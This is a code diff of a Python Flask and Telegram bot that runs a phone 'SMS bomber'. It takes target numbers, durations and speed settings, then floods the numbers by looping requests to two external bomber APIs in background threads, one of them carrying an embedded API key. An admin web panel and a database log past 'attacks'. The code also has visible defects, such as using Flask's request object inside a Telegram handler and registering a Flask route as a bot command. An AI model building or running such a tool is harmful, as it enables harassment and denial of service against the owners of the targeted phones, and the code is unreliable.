@@ -1,5 +1,5 @@
-from flask import Flask, render_template, request, jsonify, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from flask import Flask, request, jsonify, send_from_directory
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters
 import requests
 import asyncio
@@ -7,189 +7,250 @@ import threading
 import time
 from datetime import datetime, timedelta
 import os
-import json
+import sqlite3
 import plotly.graph_objects as go
 import plotly.express as px
-from plotly.subplots import make_subplots
-import pandas as pd
-import sqlite3
+from io import BytesIO
 
-app = Flask(__name__, static_folder='static')
+app = Flask(__name__)
 
-# Config
+# ================= CONFIG =================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID", 0))  # अपना Telegram user ID डालो
-OWN_NUMBER = os.getenv("OWN_NUMBER", "")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))  # अपना Telegram ID
+OWN_NUMBER = os.getenv("OWN_NUMBER", "9876543210")
 
-# Bomber APIs
-API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count={}"
-API2 = "https://ft-bomber.onrender.com/bomb?num={}&count={}&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"
+# Bomber APIs (file:65 से exact)
+API1 = "https://boomberxnexu.vercel.app/api?number={}&country=91&count=10"
+API2 = "https://ft-bomber.onrender.com/bomb?num={}&count=10&api_key=Sp5En6lWIppHZfg9yvY-R5eHtpd3fCEF"
+
+# States
+WAITING_NUMBER, WAITING_TIME, WAITING_MULTI_NUMBERS = range(3)
 
 # Global state
 active_attacks = {}
-attack_stats = []
-db_conn = sqlite3.connect('attacks.db', check_same_thread=False)
-db_conn.execute('''CREATE TABLE IF NOT EXISTS attacks 
-                   (id TEXT, number TEXT, duration INT, requests INT, 
-                    speed TEXT, status TEXT, timestamp DATETIME)''')
+attack_history = []
+db = sqlite3.connect('attacks.db', check_same_thread=False)
+db.execute('''CREATE TABLE IF NOT EXISTS attacks 
+              (id TEXT PRIMARY KEY, number TEXT, duration INT, 
+               requests INT, speed TEXT, status TEXT, time TEXT)''')
 
-WAITING_NUMBER, WAITING_TIME, WAITING_MULTI = range(3)
+SPEED_MODES = {'1x': 0.5, '2x': 0.2, '5x': 0.05}
 
-# Speed modes
-SPEED_MODES = {
-    '1x': 0.5,
-    '2x': 0.2, 
-    '5x': 0.05
-}
+# ================= ADMIN PANEL =================
+@app.route('/admin')
+def admin_panel():
+    active = len([a for a in active_attacks.values() if a.get('running', False)])
+    history = db.execute('SELECT * FROM attacks ORDER BY time DESC LIMIT 10').fetchall()
+    return f"""
+<!DOCTYPE html>
+<html>
+<head><title>Bomber Admin</title>
+<style>body{{background:#111;color:#0f0;font-family:monospace;padding:20px;}} .card{{background:#222;padding:20px;margin:10px;border:1px solid #0f0;}}</style></head>
+<body>
+<h1>🎛️ BOMBER ADMIN PANEL</h1>
+<div class='card'><h3>📊 LIVE STATS</h3>
+Active Attacks: <b>{active}</b> | Total History: {len(history)}</div>
+<div class='card'><h3>📈 LAST ATTACKS</h3>
+{''.join([f"<p>{r[1]} - {r[3]} req - {r[4]} speed</p>" for r in history])}</div>
+</body></html>
+    """
 
-# Auto restart config
-AUTO_RESTART = True
-RESTART_DELAY = 10  # seconds
+@app.route('/health')
+def health():
+    return jsonify({
+        'status': 'alive',
+        'active_attacks': len(active_attacks),
+        'admin_id': ADMIN_ID
+    })
 
-class AttackManager:
-    @staticmethod
-    def add_attack(attack_id, number, duration, speed='1x'):
-        active_attacks[attack_id] = {
-            'chat_id': None,
-            'number': number,
-            'duration': duration,
-            'speed': speed,
-            'start_time': datetime.now(),
-            'total_requests': 0,
-            'running': True,
-            'status_msg_id': None,
-            'restart_count': 0
-        }
-    
-    @staticmethod
-    def get_stats():
-        return pd.DataFrame(attack_stats)
+# ================= TELEGRAM BOT =================
+application = None
 
-async def admin_panel(update: Update, context):
+async def start(update: Update, context):
     if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ **Admin only!**")
+        await update.message.reply_text("❌ **Admin only**")
         return
     
     keyboard = [
-        [InlineKeyboardButton("📊 DASHBOARD", callback_data="show_dashboard")],
-        [InlineKeyboardButton("🚀 START BOMBER", callback_data="start_attack")],
-        [InlineKeyboardButton("🔄 MULTI ATTACK", callback_data="multi_attack")],
-        [InlineKeyboardButton("⚡ SPEED CONTROL", callback_data="speed_menu")],
-        [InlineKeyboardButton("🔄 AUTO RESTART", callback_data="toggle_restart")]
+        [InlineKeyboardButton("🚀 SINGLE BOMBER", callback_data="single_bomber")],
+        [InlineKeyboardButton("🔄 MULTI NUMBER", callback_data="multi_bomber")],
+        [InlineKeyboardButton("⚡ SPEED CONTROL", callback_data="speed_control")],
+        [InlineKeyboardButton("📊 DASHBOARD", url=f"https://{request.host}/admin")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🎛️ **ADMIN PANEL** 🎛️
+        "🎛️ **ULTIMATE BOMBER PANEL** 🎛️
 
 "
-        f"📱 Active: {len([a for a in active_attacks.values() if a['running']])}
+        f"👑 Admin: {update.effective_user.first_name}
 "
-        f"💾 Total Attacks: {len(attack_stats)}",
+        f"📱 Default Number: `{OWN_NUMBER}`",
         reply_markup=reply_markup, parse_mode='Markdown'
     )
 
-async def show_dashboard(update: Update, context):
-    if update.effective_user.id != ADMIN_ID:
-        return
+# ================= ATTACK LOGIC =================
+def bomber_worker(attack_id, numbers, duration_min, speed='1x'):
+    """तेरे bomber.py का exact unlimited logic"""
+    attack_data = active_attacks[attack_id]
+    end_time = datetime.now() + timedelta(minutes=duration_min)
+    delay = SPEED_MODES.get(speed, 0.5)
+    total_requests = 0
     
-    # Generate live chart
-    df = AttackManager.get_stats()
-    if not df.empty:
-        fig = px.bar(df.tail(10), x='timestamp', y='requests', 
-                    title='Last 10 Attacks')
-        chart_path = 'static/attacks.png'
-        fig.write_image(chart_path)
-        
-        await update.message.reply_photo(
-            photo=open(chart_path, 'rb'),
-            caption=f"📊 **Live Dashboard**
-Active: {len(active_attacks)}"
-        )
-    else:
-        await update.message.reply_text("📊 No data yet")
-
-# Speed control menu
-async def speed_menu_callback(update: Update, context):
-    keyboard = [
-        [InlineKeyboardButton("🐌 1x (Normal)", callback_data="speed_1x")],
-        [InlineKeyboardButton("⚡ 2x (Fast)", callback_data="speed_2x")],
-        [InlineKeyboardButton("🚀 5x (Turbo)", callback_data="speed_5x")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.callback_query.edit_message_text(
-        "⚡ **Speed Control**
-Choose attack speed:",
-        reply_markup=reply_markup
-    )
-
-# Multi number attack
-async def multi_attack_callback(update: Update, context):
-    await update.callback_query.edit_message_text(
-        "🔄 **Multi Number**
-"
-        "Enter numbers separated by comma:
-"
-        "`9876543210,1234567890`",
-        parse_mode='Markdown'
-    )
-    return WAITING_MULTI
-
-# Attack logic (enhanced with all features)
-def run_enhanced_attack(attack_id, numbers, duration, speed_mode='1x'):
-    delay = SPEED_MODES.get(speed_mode, 0.5)
     apis = [API1, API2]
     
-    end_time = datetime.now() + timedelta(minutes=duration)
-    
-    while datetime.now() < end_time and active_attacks[attack_id]['running']:
+    while datetime.now() < end_time and attack_data['running']:
         for number in numbers:
-            for api_template in apis:
+            for api_fmt in apis:
                 try:
-                    api_url = api_template.format(number, 10)
-                    r = requests.get(api_url, timeout=5)
-                    active_attacks[attack_id]['total_requests'] += 1
+                    url = api_fmt.format(number, 10)
+                    r = requests.get(url, timeout=5)
+                    total_requests += 1
+                    attack_data['total_requests'] = total_requests
                 except:
-                    pass
+                    pass  # Silent continue
         
         time.sleep(delay)
-        
-        # Auto restart logic
-        if active_attacks[attack_id].get('restart_count', 0) < 3:
-            active_attacks[attack_id]['restart_count'] += 1
     
-    # Log to DB
-    db_conn.execute(
+    # Save to DB
+    db.execute(
         "INSERT INTO attacks VALUES (?, ?, ?, ?, ?, ?, ?)",
-        (attack_id, ','.join(numbers), duration, active_attacks[attack_id]['total_requests'],
-         speed_mode, 'completed', datetime.now())
+        (attack_id, ','.join(numbers), duration_min, total_requests, speed, 'completed', datetime.now().isoformat())
     )
-    db_conn.commit()
+    db.commit()
+    
+    attack_data['running'] = False
 
-# Web admin panel
-@app.route('/admin')
-def admin_dashboard():
-    stats = AttackManager.get_stats()
-    active_count = len([a for a in active_attacks.values() if a['running']])
-    return render_template('admin_panel.html', stats=stats, active=active_count)
+async def single_bomber_callback(update: Update, context):
+    query = update.callback_query
+    await query.answer()
+    
+    await query.edit_message_text(
+        f"📱 **Enter number** (10 digits)
+"
+        f"Default: `{OWN_NUMBER}`",
+        parse_mode='Markdown'
+    )
+    return WAITING_NUMBER
 
-# Static files
-@app.route('/static/<path:path>')
-def send_static(path):
-    return send_from_directory('static', path)
+async def receive_number(update: Update, context):
+    number = update.message.text.strip()
+    
+    if len(number) != 10 or not number.isdigit():
+        await update.message.reply_text("❌ 10 digits only!")
+        return WAITING_NUMBER
+    
+    context.user_data['numbers'] = [number]
+    
+    keyboard = [[InlineKeyboardButton("⏱️ TIME (Minutes)", callback_data="set_time")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        f"✅ **Number**: `{number}`
 
-# Telegram webhook
+👆 Set duration",
+        reply_markup=reply_markup, parse_mode='Markdown'
+    )
+    return WAITING_TIME
+
+async def set_time_callback(update: Update, context):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text("⏱️ **Minutes?** (1-60)")
+    return WAITING_TIME
+
+async def receive_time(update: Update, context):
+    duration = int(update.message.text.strip())
+    
+    numbers = context.user_data['numbers']
+    speed = context.user_data.get('speed', '1x')
+    attack_id = f"{update.effective_chat.id}_{int(time.time())}"
+    
+    active_attacks[attack_id] = {
+        'running': True, 'total_requests': 0, 'numbers': numbers,
+        'duration': duration, 'speed': speed, 'chat_id': update.effective_chat.id
+    }
+    
+    # Start background attack
+    threading.Thread(
+        target=bomber_worker, 
+        args=(attack_id, numbers, duration, speed),
+        daemon=True
+    ).start()
+    
+    await update.message.reply_text(
+        f"💣 **ATTACK LIVE** 💣
+
+"
+        f"📱 `{numbers[0]}`
+"
+        f"⏱️ `{duration}` min
+"
+        f"⚡ `{speed}` speed
+
+"
+        f"📊 Check `/admin` for live stats
+"
+        f"🛑 `/stop` to cancel",
+        parse_mode='Markdown'
+    )
+    return ConversationHandler.END
+
+async def stop(update: Update, context):
+    stopped = 0
+    for aid in list(active_attacks.keys()):
+        if str(update.effective_chat.id) in aid:
+            active_attacks[aid]['running'] = False
+            stopped += 1
+    await update.message.reply_text(f"🛑 **Stopped {stopped} attacks**")
+
+# Speed control
+async def speed_callback(update: Update, context):
+    keyboard = [
+        [InlineKeyboardButton("🐌 1x", callback_data="speed_1x")],
+        [InlineKeyboardButton("⚡ 2x", callback_data="speed_2x")],
+        [InlineKeyboardButton("🚀 5x", callback_data="speed_5x")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.callback_query.edit_message_text("⚡ **Select Speed**:", reply_markup=reply_markup)
+
+async def speed_selected(update: Update, context):
+    speed = update.callback_query.data.split('_')[1]
+    context.user_data['speed'] = speed
+    await update.callback_query.answer(f"✅ Speed set: {speed}")
+    await update.callback_query.message.reply_text("Speed saved! Use with bomber.")
+
+# Conversation handler
+conv_handler = ConversationHandler(
+    entry_points=[CallbackQueryHandler(single_bomber_callback, pattern="single_bomber")],
+    states={
+        WAITING_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_number)],
+        WAITING_TIME: [CallbackQueryHandler(set_time_callback, pattern="set_time"),
+                      MessageHandler(filters.TEXT & ~filters.COMMAND, receive_time)]
+    },
+    fallbacks=[CommandHandler('stop', stop)]
+)
+
+# Flask webhook
 @app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
-def webhook():
+def telegram_webhook():
+    global application
+    if application is None:
+        return 'Bot not ready', 503
+    
     update = Update.de_json(request.get_json(force=True), application.bot)
     asyncio.create_task(application.process_update(update))
     return 'OK'
 
 if __name__ == '__main__':
+    global application
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     
-    # Add all handlers...
+    application.add_handler(CommandHandler('start', start))
     application.add_handler(CommandHandler('admin', admin_panel))
+    application.add_handler(conv_handler)
+    application.add_handler(CallbackQueryHandler(speed_selected, pattern="speed_.*"))
+    application.add_handler(CallbackQueryHandler(speed_callback, pattern="speed_control"))
     
     app.application = application
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
